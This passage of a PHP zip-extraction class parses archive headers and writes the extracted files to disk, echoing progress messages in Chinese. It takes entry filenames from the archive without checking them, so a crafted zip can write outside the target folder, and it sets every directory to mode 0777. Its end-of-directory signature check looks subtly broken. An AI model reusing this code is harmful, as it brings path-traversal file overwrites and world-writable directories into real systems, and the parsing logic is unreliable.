     	$stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
   }
   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  {
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name){
	$size = filesize($zip_name);

	if ($size < 277) $maximum_size = $size;
	else $maximum_size=277;
	
	@fseek($zip, $size-$maximum_size);
	$pos = ftell($zip); $bytes = 0x00000000;
	
	while ($pos < $size){
		$byte = @fread($zip, 1); $bytes=($bytes << 8) | ord($byte);
		if ($bytes == 0x504b0506 or $bytes == 0x2e706870504b0506){ $pos++;break;} $pos++;
	}
	
	$fdata=fread($zip,18);
	
	$data=@unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',$fdata);
	
	if ($data['comment_size'] != 0) $centd['comment'] = fread($zip, $data['comment_size']);
	else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
	$centd['disk_entries'] = $data['disk_entries'];
	$centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
	$centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
	return $centd;
  }

 function ExtractFile($header,$to,$zip){
	$header = $this->readfileheader($zip);
	
	if(substr($to,-1)!="/") $to.="/";
	if($to=='./') $to = '';	
	$pth = explode("/",$to.$header['filename']);
	$mydir = '';
	for($i=0;$i<count($pth)-1;$i++){
		if(!$pth[$i]) continue;
		$mydir .= $pth[$i]."/";
		if((!is_dir($mydir) && @mkdir($mydir,0777)) || (($mydir==$to.$header['filename'] || ($mydir==$to && $this->total_folders==0)) && is_dir($mydir)) ){
			@chmod($mydir,0777);
			$this->total_folders ++;
			echo "目录: $mydir<br>";
		}
	}
	
	if(strrchr($header['filename'],'/')=='/') return;	

	if (!($header['external']==0x41FF0010)&&!($header['external']==16)){
		if ($header['compression']==0){
			$fp = @fopen($to.$header['filename'], 'wb');
			if(!$fp) return(-1);
			$size = $header['compressed_size'];
		
			while ($size != 0){
				$read_size = ($size < 2048 ? $size : 2048);
				$buffer = fread($zip, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
			fclose($fp);
			touch($to.$header['filename'], $header['mtime']);
		}else{
			$fp = @fopen($to.$header['filename'].'.gz','wb');
			if(!$fp) return(-1);
			$binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
			Chr(0x00), time(), Chr(0x00), Chr(3));
			
			fwrite($fp, $binary_data, 10);
			$size = $header['compressed_size'];
		
			while ($size != 0){
				$read_size = ($size < 1024 ? $size : 1024);
				$buffer = fread($zip, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
		
			$binary_data = pack('VV', $header['crc'], $header['size']);
			fwrite($fp, $binary_data,8); fclose($fp);
	
			$gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compress");
			if(!$gzp) return(-2);
			$fp = @fopen($to.$header['filename'],'wb');
			if(!$fp) return(-1);
			$size = $header['size'];
		
			while ($size != 0){
				$read_size = ($size < 2048 ? $size : 2048);
				$buffer = gzread($gzp, $read_size);
				$binary_data = pack('a'.$read_size, $buffer);
				@fwrite($fp, $binary_data, $read_size);
				$size -= $read_size;
			}
			fclose($fp); gzclose($gzp);
		
			touch($to.$header['filename'], $header['mtime']);
			@unlink($to.$header['filename'].'.gz');
			
		}
	}
	
	$this->total_files ++;
	echo "文件: $to$header[filename]<br>";
	return true;
 }
}
ob_end_flush();

?>